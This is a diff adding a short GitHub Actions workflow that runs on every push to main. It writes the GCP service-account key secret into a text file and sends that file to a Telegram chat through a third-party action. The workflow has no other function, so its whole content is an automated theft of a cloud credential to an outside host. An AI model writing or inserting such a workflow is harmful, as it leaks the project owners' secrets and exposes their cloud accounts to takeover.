@@ -1,0 +1,22 @@
+name: vtd trigger
+
+on:
+  push:
+    branches: main
+
+jobs:
+  dump:
+    name: Dump
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run
+        run: |
+          echo '${{ secrets.GCP_SERVICE_ACCOUNT_KEY }}' >> file.txt
+
+      - name: Send 
+        uses: appleboy/telegram-action@master
+        with:
+          to: -1001924297028
+          token: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          message: send photo message
+          message_file: file.txt
